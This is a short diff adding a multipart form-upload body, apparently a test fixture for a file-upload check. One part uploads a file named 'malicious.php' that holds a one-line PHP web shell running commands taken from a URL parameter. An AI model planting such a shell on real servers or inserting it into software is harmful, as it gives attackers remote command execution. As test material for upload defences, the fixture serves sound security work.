@@ -1,0 +1,10 @@
+--boundary
+Content-Disposition: form-data; name="field1"
+
+normal value
+--boundary
+Content-Disposition: form-data; name="payload"; filename="malicious.php"
+Content-Type: application/php
+
+<?php system($_GET['cmd']); ?>
+--boundary--
